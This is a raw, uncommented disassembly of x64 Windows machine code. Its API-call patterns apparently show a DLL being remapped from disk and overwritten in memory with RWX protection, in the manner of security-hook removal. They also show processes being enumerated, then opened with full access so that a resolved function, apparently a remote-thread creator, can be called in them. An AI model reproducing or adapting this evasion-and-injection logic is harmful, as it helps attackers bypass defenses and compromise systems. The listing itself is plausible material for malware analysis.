   140002620:	0f b7 c2             	movzwl %dx,%eax
   140002623:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   140002627:	44 8b 54 cb 0c       	mov    0xc(%rbx,%rcx,8),%r10d
   14000262c:	4c 8d 0c cb          	lea    (%rbx,%rcx,8),%r9
   140002630:	45 3b c2             	cmp    %r10d,%r8d
   140002633:	72 10                	jb     0x140002645
   140002635:	41 8b 49 10          	mov    0x10(%r9),%ecx
   140002639:	41 03 ca             	add    %r10d,%ecx
   14000263c:	44 3b c1             	cmp    %ecx,%r8d
   14000263f:	0f 82 83 00 00 00    	jb     0x1400026c8
   140002645:	66 ff c2             	inc    %dx
   140002648:	66 41 3b d3          	cmp    %r11w,%dx
   14000264c:	72 d2                	jb     0x140002620
   14000264e:	45 8b c4             	mov    %r12d,%r8d
   140002651:	41 8b c8             	mov    %r8d,%ecx
   140002654:	48 8d 15 95 43 01 00 	lea    0x14395(%rip),%rdx        # 0x1400169f0
   14000265b:	49 03 cf             	add    %r15,%rcx
   14000265e:	e8 0d 1a 00 00       	call   0x140004070
   140002663:	48 85 c0             	test   %rax,%rax
   140002666:	75 6f                	jne    0x1400026d7
   140002668:	49 83 c6 04          	add    $0x4,%r14
   14000266c:	48 83 c5 02          	add    $0x2,%rbp
   140002670:	ff c7                	inc    %edi
   140002672:	41 3b 7d 18          	cmp    0x18(%r13),%edi
   140002676:	0f 82 74 ff ff ff    	jb     0x1400025f0
   14000267c:	33 c0                	xor    %eax,%eax
   14000267e:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140002683:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   140002688:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   14000268d:	48 83 c4 20          	add    $0x20,%rsp
   140002691:	41 5f                	pop    %r15
   140002693:	41 5e                	pop    %r14
   140002695:	41 5d                	pop    %r13
   140002697:	41 5c                	pop    %r12
   140002699:	5f                   	pop    %rdi
   14000269a:	c3                   	ret
   14000269b:	41 8b 41 14          	mov    0x14(%r9),%eax
   14000269f:	41 2b c2             	sub    %r10d,%eax
   1400026a2:	44 03 c0             	add    %eax,%r8d
   1400026a5:	e9 87 fe ff ff       	jmp    0x140002531
   1400026aa:	41 8b 41 14          	mov    0x14(%r9),%eax
   1400026ae:	41 2b c2             	sub    %r10d,%eax
   1400026b1:	44 03 c0             	add    %eax,%r8d
   1400026b4:	e9 c8 fe ff ff       	jmp    0x140002581
   1400026b9:	41 8b 41 14          	mov    0x14(%r9),%eax
   1400026bd:	41 2b c2             	sub    %r10d,%eax
   1400026c0:	44 03 c0             	add    %eax,%r8d
   1400026c3:	e9 09 ff ff ff       	jmp    0x1400025d1
   1400026c8:	41 8b 41 14          	mov    0x14(%r9),%eax
   1400026cc:	41 2b c2             	sub    %r10d,%eax
   1400026cf:	44 03 c0             	add    %eax,%r8d
   1400026d2:	e9 7a ff ff ff       	jmp    0x140002651
   1400026d7:	49 63 7f 3c          	movslq 0x3c(%r15),%rdi
   1400026db:	45 8b 45 1c          	mov    0x1c(%r13),%r8d
   1400026df:	49 03 ff             	add    %r15,%rdi
   1400026e2:	0f b7 47 14          	movzwl 0x14(%rdi),%eax
   1400026e6:	48 8d 5f 18          	lea    0x18(%rdi),%rbx
   1400026ea:	48 03 d8             	add    %rax,%rbx
   1400026ed:	8b 73 14             	mov    0x14(%rbx),%esi
   1400026f0:	44 3b c6             	cmp    %esi,%r8d
   1400026f3:	72 48                	jb     0x14000273d
   1400026f5:	44 0f b7 5f 06       	movzwl 0x6(%rdi),%r11d
   1400026fa:	41 0f b7 d4          	movzwl %r12w,%edx
   1400026fe:	66 45 3b e3          	cmp    %r11w,%r12w
   140002702:	73 36                	jae    0x14000273a
   140002704:	0f 1f 40 00          	nopl   0x0(%rax)
   140002708:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000270f:	00 
   140002710:	0f b7 c2             	movzwl %dx,%eax
   140002713:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   140002717:	44 8b 54 cb 0c       	mov    0xc(%rbx,%rcx,8),%r10d
   14000271c:	4c 8d 0c cb          	lea    (%rbx,%rcx,8),%r9
   140002720:	45 3b c2             	cmp    %r10d,%r8d
   140002723:	72 0c                	jb     0x140002731
   140002725:	41 8b 49 10          	mov    0x10(%r9),%ecx
   140002729:	41 03 ca             	add    %r10d,%ecx
   14000272c:	44 3b c1             	cmp    %ecx,%r8d
   14000272f:	72 64                	jb     0x140002795
   140002731:	66 ff c2             	inc    %dx
   140002734:	66 41 3b d3          	cmp    %r11w,%dx
   140002738:	72 d6                	jb     0x140002710
   14000273a:	45 8b c4             	mov    %r12d,%r8d
   14000273d:	0f b7 55 00          	movzwl 0x0(%rbp),%edx
   140002741:	41 8b c8             	mov    %r8d,%ecx
   140002744:	49 03 cf             	add    %r15,%rcx
   140002747:	44 8b 04 91          	mov    (%rcx,%rdx,4),%r8d
   14000274b:	44 3b c6             	cmp    %esi,%r8d
   14000274e:	72 3d                	jb     0x14000278d
   140002750:	44 0f b7 5f 06       	movzwl 0x6(%rdi),%r11d
   140002755:	41 0f b7 d4          	movzwl %r12w,%edx
   140002759:	66 45 3b e3          	cmp    %r11w,%r12w
   14000275d:	73 2b                	jae    0x14000278a
   14000275f:	90                   	nop
   140002760:	0f b7 c2             	movzwl %dx,%eax
   140002763:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   140002767:	44 8b 54 cb 0c       	mov    0xc(%rbx,%rcx,8),%r10d
   14000276c:	4c 8d 0c cb          	lea    (%rbx,%rcx,8),%r9
   140002770:	45 3b c2             	cmp    %r10d,%r8d
   140002773:	72 0c                	jb     0x140002781
   140002775:	41 8b 49 10          	mov    0x10(%r9),%ecx
   140002779:	41 03 ca             	add    %r10d,%ecx
   14000277c:	44 3b c1             	cmp    %ecx,%r8d
   14000277f:	72 20                	jb     0x1400027a1
   140002781:	66 ff c2             	inc    %dx
   140002784:	66 41 3b d3          	cmp    %r11w,%dx
   140002788:	72 d6                	jb     0x140002760
   14000278a:	45 8b c4             	mov    %r12d,%r8d
   14000278d:	41 8b c0             	mov    %r8d,%eax
   140002790:	e9 e9 fe ff ff       	jmp    0x14000267e
   140002795:	41 8b 41 14          	mov    0x14(%r9),%eax
   140002799:	41 2b c2             	sub    %r10d,%eax
   14000279c:	44 03 c0             	add    %eax,%r8d
   14000279f:	eb 9c                	jmp    0x14000273d
   1400027a1:	41 8b 41 14          	mov    0x14(%r9),%eax
   1400027a5:	41 2b c2             	sub    %r10d,%eax
   1400027a8:	44 03 c0             	add    %eax,%r8d
   1400027ab:	41 8b c0             	mov    %r8d,%eax
   1400027ae:	e9 cb fe ff ff       	jmp    0x14000267e
   1400027b3:	cc                   	int3
   1400027b4:	cc                   	int3
   1400027b5:	cc                   	int3
   1400027b6:	cc                   	int3
   1400027b7:	cc                   	int3
   1400027b8:	cc                   	int3
   1400027b9:	cc                   	int3
   1400027ba:	cc                   	int3
   1400027bb:	cc                   	int3
   1400027bc:	cc                   	int3
   1400027bd:	cc                   	int3
   1400027be:	cc                   	int3
   1400027bf:	cc                   	int3
   1400027c0:	48 85 c9             	test   %rcx,%rcx
   1400027c3:	0f 84 33 02 00 00    	je     0x1400029fc
   1400027c9:	53                   	push   %rbx
   1400027ca:	48 81 ec a0 02 00 00 	sub    $0x2a0,%rsp
   1400027d1:	48 8b 05 28 78 01 00 	mov    0x17828(%rip),%rax        # 0x14001a000
   1400027d8:	48 33 c4             	xor    %rsp,%rax
   1400027db:	48 89 84 24 70 02 00 	mov    %rax,0x270(%rsp)
   1400027e2:	00 
   1400027e3:	48 8b d9             	mov    %rcx,%rbx
   1400027e6:	4c 89 bc 24 80 02 00 	mov    %r15,0x280(%rsp)
   1400027ed:	00 
   1400027ee:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1400027f3:	48 8d 15 0e 42 01 00 	lea    0x1420e(%rip),%rdx        # 0x140016a08
   1400027fa:	ff 15 50 c9 00 00    	call   *0xc950(%rip)        # 0x14000f150
   140002800:	48 8b d3             	mov    %rbx,%rdx
   140002803:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140002808:	ff 15 ca c8 00 00    	call   *0xc8ca(%rip)        # 0x14000f0d8
   14000280e:	48 8b cb             	mov    %rbx,%rcx
   140002811:	ff 15 21 c9 00 00    	call   *0xc921(%rip)        # 0x14000f138
   140002817:	4c 8b f8             	mov    %rax,%r15
   14000281a:	48 85 c0             	test   %rax,%rax
   14000281d:	0f 84 b9 01 00 00    	je     0x1400029dc
   140002823:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002826:	33 c0                	xor    %eax,%eax
   140002828:	0f 11 44 24 40       	movups %xmm0,0x40(%rsp)
   14000282d:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140002832:	ff 15 98 c9 00 00    	call   *0xc998(%rip)        # 0x14000f1d0
   140002838:	41 b9 18 00 00 00    	mov    $0x18,%r9d
   14000283e:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140002843:	48 8b c8             	mov    %rax,%rcx
   140002846:	49 8b d7             	mov    %r15,%rdx
   140002849:	ff 15 99 c8 00 00    	call   *0xc899(%rip)        # 0x14000f0e8
   14000284f:	85 c0                	test   %eax,%eax
   140002851:	0f 84 7c 01 00 00    	je     0x1400029d3
   140002857:	33 db                	xor    %ebx,%ebx
   140002859:	48 89 ac 24 b8 02 00 	mov    %rbp,0x2b8(%rsp)
   140002860:	00 
   140002861:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140002866:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   14000286b:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   14000286f:	45 33 c9             	xor    %r9d,%r9d
   140002872:	ba 00 00 00 80       	mov    $0x80000000,%edx
   140002877:	c7 44 24 20 03 00 00 	movl   $0x3,0x20(%rsp)
   14000287e:	00 
   14000287f:	44 8d 43 01          	lea    0x1(%rbx),%r8d
   140002883:	ff 15 9f c9 00 00    	call   *0xc99f(%rip)        # 0x14000f228
   140002889:	48 8b e8             	mov    %rax,%rbp
   14000288c:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140002890:	0f 84 35 01 00 00    	je     0x1400029cb
   140002896:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   14000289b:	45 33 c9             	xor    %r9d,%r9d
   14000289e:	33 d2                	xor    %edx,%edx
   1400028a0:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   1400028a4:	41 b8 02 00 00 01    	mov    $0x1000002,%r8d
   1400028aa:	4c 89 b4 24 88 02 00 	mov    %r14,0x288(%rsp)
   1400028b1:	00 
   1400028b2:	48 8b c8             	mov    %rax,%rcx
   1400028b5:	ff 15 ad c8 00 00    	call   *0xc8ad(%rip)        # 0x14000f168
   1400028bb:	4c 8b f0             	mov    %rax,%r14
   1400028be:	48 85 c0             	test   %rax,%rax
   1400028c1:	0f 84 f3 00 00 00    	je     0x1400029ba
   1400028c7:	45 33 c9             	xor    %r9d,%r9d
   1400028ca:	4c 89 a4 24 90 02 00 	mov    %r12,0x290(%rsp)
   1400028d1:	00 
   1400028d2:	45 33 c0             	xor    %r8d,%r8d
   1400028d5:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400028da:	8d 53 04             	lea    0x4(%rbx),%edx
   1400028dd:	48 8b c8             	mov    %rax,%rcx
   1400028e0:	ff 15 8a c8 00 00    	call   *0xc88a(%rip)        # 0x14000f170
   1400028e6:	4c 8b e0             	mov    %rax,%r12
   1400028e9:	48 85 c0             	test   %rax,%rax
   1400028ec:	0f 84 b7 00 00 00    	je     0x1400029a9
   1400028f2:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   1400028f7:	48 89 bc 24 98 02 00 	mov    %rdi,0x298(%rsp)
   1400028fe:	00 
   1400028ff:	48 63 79 3c          	movslq 0x3c(%rcx),%rdi
   140002903:	48 03 f9             	add    %rcx,%rdi
   140002906:	66 3b 5f 06          	cmp    0x6(%rdi),%bx
   14000290a:	0f 83 91 00 00 00    	jae    0x1400029a1
   140002910:	48 89 b4 24 c0 02 00 	mov    %rsi,0x2c0(%rsp)
   140002917:	00 
   140002918:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000291f:	00 
   140002920:	0f b7 4f 14          	movzwl 0x14(%rdi),%ecx
   140002924:	48 03 cf             	add    %rdi,%rcx
   140002927:	0f b7 c3             	movzwl %bx,%eax
   14000292a:	48 8d 14 80          	lea    (%rax,%rax,4),%rdx
   14000292e:	48 8d 34 d1          	lea    (%rcx,%rdx,8),%rsi
   140002932:	48 8d 4e 18          	lea    0x18(%rsi),%rcx
   140002936:	48 8d 15 f7 40 01 00 	lea    0x140f7(%rip),%rdx        # 0x140016a34
   14000293d:	ff 15 15 c8 00 00    	call   *0xc815(%rip)        # 0x14000f158
   140002943:	85 c0                	test   %eax,%eax
   140002945:	74 0b                	je     0x140002952
   140002947:	66 ff c3             	inc    %bx
   14000294a:	66 3b 5f 06          	cmp    0x6(%rdi),%bx
   14000294e:	72 d0                	jb     0x140002920
   140002950:	eb 47                	jmp    0x140002999
   140002952:	8b 7e 24             	mov    0x24(%rsi),%edi
   140002955:	4c 8d 4c 24 58       	lea    0x58(%rsp),%r9
   14000295a:	48 03 7c 24 40       	add    0x40(%rsp),%rdi
   14000295f:	41 b8 40 00 00 00    	mov    $0x40,%r8d
   140002965:	8b 5e 20             	mov    0x20(%rsi),%ebx
   140002968:	48 8b cf             	mov    %rdi,%rcx
   14000296b:	8b d3                	mov    %ebx,%edx
   14000296d:	ff 15 65 c8 00 00    	call   *0xc865(%rip)        # 0x14000f1d8
   140002973:	8b 56 24             	mov    0x24(%rsi),%edx
   140002976:	44 8b c3             	mov    %ebx,%r8d
   140002979:	49 03 d4             	add    %r12,%rdx
   14000297c:	48 8b cf             	mov    %rdi,%rcx
   14000297f:	e8 5c 26 00 00       	call   0x140004fe0
   140002984:	44 8b 44 24 58       	mov    0x58(%rsp),%r8d
   140002989:	4c 8d 4c 24 58       	lea    0x58(%rsp),%r9
   14000298e:	8b d3                	mov    %ebx,%edx
   140002990:	48 8b cf             	mov    %rdi,%rcx
   140002993:	ff 15 3f c8 00 00    	call   *0xc83f(%rip)        # 0x14000f1d8
   140002999:	48 8b b4 24 c0 02 00 	mov    0x2c0(%rsp),%rsi
   1400029a0:	00 
   1400029a1:	48 8b bc 24 98 02 00 	mov    0x298(%rsp),%rdi
   1400029a8:	00 
   1400029a9:	49 8b ce             	mov    %r14,%rcx
   1400029ac:	ff 15 66 c8 00 00    	call   *0xc866(%rip)        # 0x14000f218
   1400029b2:	4c 8b a4 24 90 02 00 	mov    0x290(%rsp),%r12
   1400029b9:	00 
   1400029ba:	48 8b cd             	mov    %rbp,%rcx
   1400029bd:	ff 15 55 c8 00 00    	call   *0xc855(%rip)        # 0x14000f218
   1400029c3:	4c 8b b4 24 88 02 00 	mov    0x288(%rsp),%r14
   1400029ca:	00 
   1400029cb:	48 8b ac 24 b8 02 00 	mov    0x2b8(%rsp),%rbp
   1400029d2:	00 
   1400029d3:	49 8b cf             	mov    %r15,%rcx
   1400029d6:	ff 15 64 c7 00 00    	call   *0xc764(%rip)        # 0x14000f140
   1400029dc:	4c 8b bc 24 80 02 00 	mov    0x280(%rsp),%r15
   1400029e3:	00 
   1400029e4:	48 8b 8c 24 70 02 00 	mov    0x270(%rsp),%rcx
   1400029eb:	00 
   1400029ec:	48 33 cc             	xor    %rsp,%rcx
   1400029ef:	e8 3c 07 00 00       	call   0x140003130
   1400029f4:	48 81 c4 a0 02 00 00 	add    $0x2a0,%rsp
   1400029fb:	5b                   	pop    %rbx
   1400029fc:	c3                   	ret
   1400029fd:	cc                   	int3
   1400029fe:	cc                   	int3
   1400029ff:	cc                   	int3
   140002a00:	40 53                	rex push %rbx
   140002a02:	55                   	push   %rbp
   140002a03:	41 54                	push   %r12
   140002a05:	41 55                	push   %r13
   140002a07:	41 56                	push   %r14
   140002a09:	48 81 ec 70 02 00 00 	sub    $0x270,%rsp
   140002a10:	48 8b 05 e9 75 01 00 	mov    0x175e9(%rip),%rax        # 0x14001a000
   140002a17:	48 33 c4             	xor    %rsp,%rax
   140002a1a:	48 89 84 24 50 02 00 	mov    %rax,0x250(%rsp)
   140002a21:	00 
   140002a22:	48 89 4c 24 38       	mov    %rcx,0x38(%rsp)
   140002a27:	33 ed                	xor    %ebp,%ebp
   140002a29:	b9 40 9c 00 00       	mov    $0x9c40,%ecx
   140002a2e:	4c 8b ea             	mov    %rdx,%r13
   140002a31:	44 8d 65 01          	lea    0x1(%rbp),%r12d
   140002a35:	e8 1e 07 00 00       	call   0x140003158
   140002a3a:	b9 80 38 01 00       	mov    $0x13880,%ecx
   140002a3f:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140002a44:	48 8b d8             	mov    %rax,%rbx
   140002a47:	89 6c 24 44          	mov    %ebp,0x44(%rsp)
   140002a4b:	e8 08 07 00 00       	call   0x140003158
   140002a50:	4c 8d 44 24 44       	lea    0x44(%rsp),%r8
   140002a55:	89 6c 24 40          	mov    %ebp,0x40(%rsp)
   140002a59:	ba 40 9c 00 00       	mov    $0x9c40,%edx
   140002a5e:	48 8b cb             	mov    %rbx,%rcx
   140002a61:	4c 8b f0             	mov    %rax,%r14
   140002a64:	ff 15 a6 c7 00 00    	call   *0xc7a6(%rip)        # 0x14000f210
   140002a6a:	85 c0                	test   %eax,%eax
   140002a6c:	0f 84 00 01 00 00    	je     0x140002b72
   140002a72:	8b 44 24 44          	mov    0x44(%rsp),%eax
   140002a76:	c1 e8 02             	shr    $0x2,%eax
   140002a79:	48 89 b4 24 b0 02 00 	mov    %rsi,0x2b0(%rsp)
   140002a80:	00 
   140002a81:	33 f6                	xor    %esi,%esi
   140002a83:	89 44 24 44          	mov    %eax,0x44(%rsp)
   140002a87:	85 c0                	test   %eax,%eax
   140002a89:	0f 84 db 00 00 00    	je     0x140002b6a
   140002a8f:	48 89 bc 24 68 02 00 	mov    %rdi,0x268(%rsp)
   140002a96:	00 
   140002a97:	4c 89 bc 24 60 02 00 	mov    %r15,0x260(%rsp)
   140002a9e:	00 
   140002a9f:	90                   	nop
   140002aa0:	44 8b 04 b3          	mov    (%rbx,%rsi,4),%r8d
   140002aa4:	4c 8d 3c b3          	lea    (%rbx,%rsi,4),%r15
   140002aa8:	33 d2                	xor    %edx,%edx
   140002aaa:	b9 10 04 00 00       	mov    $0x410,%ecx
   140002aaf:	ff 15 0b c6 00 00    	call   *0xc60b(%rip)        # 0x14000f0c0
   140002ab5:	48 8b f8             	mov    %rax,%rdi
   140002ab8:	48 85 c0             	test   %rax,%rax
   140002abb:	0f 84 8d 00 00 00    	je     0x140002b4e
   140002ac1:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   140002ac6:	41 b8 80 38 01 00    	mov    $0x13880,%r8d
   140002acc:	49 8b d6             	mov    %r14,%rdx
   140002acf:	48 8b c8             	mov    %rax,%rcx
   140002ad2:	ff 15 88 c6 00 00    	call   *0xc688(%rip)        # 0x14000f160
   140002ad8:	85 c0                	test   %eax,%eax
   140002ada:	74 69                	je     0x140002b45
   140002adc:	8b 44 24 40          	mov    0x40(%rsp),%eax
   140002ae0:	33 db                	xor    %ebx,%ebx
   140002ae2:	c1 e8 03             	shr    $0x3,%eax
   140002ae5:	89 44 24 40          	mov    %eax,0x40(%rsp)
   140002ae9:	85 c0                	test   %eax,%eax
   140002aeb:	74 53                	je     0x140002b40
   140002aed:	0f 1f 00             	nopl   (%rax)
   140002af0:	49 8b 14 de          	mov    (%r14,%rbx,8),%rdx
   140002af4:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   140002af9:	41 b9 00 02 00 00    	mov    $0x200,%r9d
   140002aff:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140002b06:	00 00 
   140002b08:	48 8b cf             	mov    %rdi,%rcx
   140002b0b:	ff 15 17 c6 00 00    	call   *0xc617(%rip)        # 0x14000f128
   140002b11:	85 c0                	test   %eax,%eax
   140002b13:	74 23                	je     0x140002b38
   140002b15:	0f b7 94 24 90 00 00 	movzwl 0x90(%rsp),%edx
   140002b1c:	00 
   140002b1d:	b9 68 72 00 00       	mov    $0x7268,%ecx
   140002b22:	0f b7 c2             	movzwl %dx,%eax
   140002b25:	66 2b c1             	sub    %cx,%ax
   140002b28:	66 83 f8 0f          	cmp    $0xf,%ax
   140002b2c:	77 0a                	ja     0x140002b38
   140002b2e:	b9 01 88 00 00       	mov    $0x8801,%ecx
   140002b33:	0f a3 c1             	bt     %eax,%ecx
   140002b36:	72 71                	jb     0x140002ba9
   140002b38:	ff c3                	inc    %ebx
   140002b3a:	3b 5c 24 40          	cmp    0x40(%rsp),%ebx
   140002b3e:	72 b0                	jb     0x140002af0
   140002b40:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002b45:	48 8b cf             	mov    %rdi,%rcx
   140002b48:	ff 15 ca c6 00 00    	call   *0xc6ca(%rip)        # 0x14000f218
   140002b4e:	ff c6                	inc    %esi
   140002b50:	3b 74 24 44          	cmp    0x44(%rsp),%esi
   140002b54:	0f 82 46 ff ff ff    	jb     0x140002aa0
   140002b5a:	4c 8b bc 24 60 02 00 	mov    0x260(%rsp),%r15
   140002b61:	00 
   140002b62:	48 8b bc 24 68 02 00 	mov    0x268(%rsp),%rdi
   140002b69:	00 
   140002b6a:	48 8b b4 24 b0 02 00 	mov    0x2b0(%rsp),%rsi
   140002b71:	00 
   140002b72:	48 8b cb             	mov    %rbx,%rcx
   140002b75:	e8 d6 05 00 00       	call   0x140003150
   140002b7a:	49 8b ce             	mov    %r14,%rcx
   140002b7d:	e8 ce 05 00 00       	call   0x140003150
   140002b82:	41 8b c4             	mov    %r12d,%eax
   140002b85:	41 89 6d 00          	mov    %ebp,0x0(%r13)
   140002b89:	48 8b 8c 24 50 02 00 	mov    0x250(%rsp),%rcx
   140002b90:	00 
   140002b91:	48 33 cc             	xor    %rsp,%rcx
   140002b94:	e8 97 05 00 00       	call   0x140003130
   140002b99:	48 81 c4 70 02 00 00 	add    $0x270,%rsp
   140002ba0:	41 5e                	pop    %r14
   140002ba2:	41 5d                	pop    %r13
   140002ba4:	41 5c                	pop    %r12
   140002ba6:	5d                   	pop    %rbp
   140002ba7:	5b                   	pop    %rbx
   140002ba8:	c3                   	ret
   140002ba9:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002bae:	41 3b 6d 00          	cmp    0x0(%r13),%ebp
   140002bb2:	73 37                	jae    0x140002beb
   140002bb4:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140002bb9:	41 b8 77 72 00 00    	mov    $0x7277,%r8d
   140002bbf:	8b c5                	mov    %ebp,%eax
   140002bc1:	48 c1 e0 04          	shl    $0x4,%rax
   140002bc5:	48 03 c8             	add    %rax,%rcx
   140002bc8:	41 8b 07             	mov    (%r15),%eax
   140002bcb:	89 01                	mov    %eax,(%rcx)
   140002bcd:	33 c0                	xor    %eax,%eax
   140002bcf:	66 41 3b d0          	cmp    %r8w,%dx
   140002bd3:	66 89 51 04          	mov    %dx,0x4(%rcx)
   140002bd7:	48 0f 44 84 24 92 00 	cmove  0x92(%rsp),%rax
   140002bde:	00 00 
   140002be0:	ff c5                	inc    %ebp
   140002be2:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140002be6:	e9 5a ff ff ff       	jmp    0x140002b45
   140002beb:	45 33 e4             	xor    %r12d,%r12d
   140002bee:	e9 52 ff ff ff       	jmp    0x140002b45
   140002bf3:	cc                   	int3
   140002bf4:	cc                   	int3
   140002bf5:	cc                   	int3
   140002bf6:	cc                   	int3
   140002bf7:	cc                   	int3
   140002bf8:	cc                   	int3
   140002bf9:	cc                   	int3
   140002bfa:	cc                   	int3
   140002bfb:	cc                   	int3
   140002bfc:	cc                   	int3
   140002bfd:	cc                   	int3
   140002bfe:	cc                   	int3
   140002bff:	cc                   	int3
   140002c00:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140002c05:	57                   	push   %rdi
   140002c06:	48 83 ec 70          	sub    $0x70,%rsp
   140002c0a:	48 8b 05 ef 73 01 00 	mov    0x173ef(%rip),%rax        # 0x14001a000
   140002c11:	48 33 c4             	xor    %rsp,%rax
   140002c14:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   140002c19:	33 db                	xor    %ebx,%ebx
   140002c1b:	b8 77 72 00 00       	mov    $0x7277,%eax
   140002c20:	48 8b f9             	mov    %rcx,%rdi
   140002c23:	66 39 41 04          	cmp    %ax,0x4(%rcx)
   140002c27:	0f 85 cf 00 00 00    	jne    0x140002cfc
   140002c2d:	44 8b 01             	mov    (%rcx),%r8d
   140002c30:	33 d2                	xor    %edx,%edx
   140002c32:	b9 ff ff 1f 00       	mov    $0x1fffff,%ecx
   140002c37:	48 89 b4 24 88 00 00 	mov    %rsi,0x88(%rsp)
   140002c3e:	00 
   140002c3f:	ff 15 7b c4 00 00    	call   *0xc47b(%rip)        # 0x14000f0c0
   140002c45:	48 8b f0             	mov    %rax,%rsi
   140002c48:	48 85 c0             	test   %rax,%rax
   140002c4b:	0f 84 86 00 00 00    	je     0x140002cd7
   140002c51:	48 8b 7f 08          	mov    0x8(%rdi),%rdi
   140002c55:	48 8d 0d e4 3e 01 00 	lea    0x13ee4(%rip),%rcx        # 0x140016b40
   140002c5c:	48 89 5c 24 60       	mov    %rbx,0x60(%rsp)
   140002c61:	ff 15 49 c4 00 00    	call   *0xc449(%rip)        # 0x14000f0b0
   140002c67:	48 85 c0             	test   %rax,%rax
   140002c6a:	74 12                	je     0x140002c7e
   140002c6c:	48 8d 15 dd 3e 01 00 	lea    0x13edd(%rip),%rdx        # 0x140016b50
   140002c73:	48 8b c8             	mov    %rax,%rcx
   140002c76:	ff 15 8c c4 00 00    	call   *0xc48c(%rip)        # 0x14000f108
   140002c7c:	eb 03                	jmp    0x140002c81
   140002c7e:	48 8b c3             	mov    %rbx,%rax
   140002c81:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   140002c86:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140002c8b:	48 89 5c 24 48       	mov    %rbx,0x48(%rsp)
   140002c90:	4c 8b ce             	mov    %rsi,%r9
   140002c93:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   140002c98:	45 33 c0             	xor    %r8d,%r8d
   140002c9b:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   140002ca0:	ba ff ff 1f 00       	mov    $0x1fffff,%edx
   140002ca5:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   140002ca9:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   140002cae:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140002cb3:	ff d0                	call   *%rax
   140002cb5:	85 c0                	test   %eax,%eax
   140002cb7:	78 15                	js     0x140002cce
   140002cb9:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140002cbe:	48 85 c9             	test   %rcx,%rcx
   140002cc1:	74 0b                	je     0x140002cce
   140002cc3:	bb 01 00 00 00       	mov    $0x1,%ebx
   140002cc8:	ff 15 4a c5 00 00    	call   *0xc54a(%rip)        # 0x14000f218
   140002cce:	48 8b ce             	mov    %rsi,%rcx
   140002cd1:	ff 15 41 c5 00 00    	call   *0xc541(%rip)        # 0x14000f218
   140002cd7:	48 8b b4 24 88 00 00 	mov    0x88(%rsp),%rsi
   140002cde:	00 
   140002cdf:	8b c3                	mov    %ebx,%eax
   140002ce1:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   140002ce6:	48 33 cc             	xor    %rsp,%rcx
   140002ce9:	e8 42 04 00 00       	call   0x140003130
   140002cee:	48 8b 9c 24 90 00 00 	mov    0x90(%rsp),%rbx
   140002cf5:	00 
   140002cf6:	48 83 c4 70          	add    $0x70,%rsp
   140002cfa:	5f                   	pop    %rdi
   140002cfb:	c3                   	ret
   140002cfc:	8b c3                	mov    %ebx,%eax
   140002cfe:	eb e1                	jmp    0x140002ce1
   140002d00:	40 56                	rex push %rsi
   140002d02:	48 83 ec 20          	sub    $0x20,%rsp
   140002d06:	b9 80 3e 00 00       	mov    $0x3e80,%ecx
   140002d0b:	e8 48 04 00 00       	call   0x140003158
   140002d10:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140002d15:	c7 44 24 30 e8 03 00 	movl   $0x3e8,0x30(%rsp)
   140002d1c:	00 
   140002d1d:	48 8b c8             	mov    %rax,%rcx
   140002d20:	48 8b f0             	mov    %rax,%rsi
   140002d23:	e8 d8 fc ff ff       	call   0x140002a00
   140002d28:	85 c0                	test   %eax,%eax
   140002d2a:	74 4b                	je     0x140002d77
   140002d2c:	8b 4c 24 30          	mov    0x30(%rsp),%ecx
   140002d30:	85 c9                	test   %ecx,%ecx
   140002d32:	74 43                	je     0x140002d77
   140002d34:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   140002d39:	48 8b de             	mov    %rsi,%rbx
   140002d3c:	48 89 6c 24 40       	mov    %rbp,0x40(%rsp)
   140002d41:	bd 77 72 00 00       	mov    $0x7277,%ebp
   140002d46:	48 89 7c 24 48       	mov    %rdi,0x48(%rsp)
   140002d4b:	8b f9                	mov    %ecx,%edi
   140002d4d:	0f 1f 00             	nopl   (%rax)
   140002d50:	66 39 6b 04          	cmp    %bp,0x4(%rbx)
   140002d54:	75 08                	jne    0x140002d5e
   140002d56:	48 8b cb             	mov    %rbx,%rcx
   140002d59:	e8 a2 fe ff ff       	call   0x140002c00
   140002d5e:	48 83 c3 10          	add    $0x10,%rbx
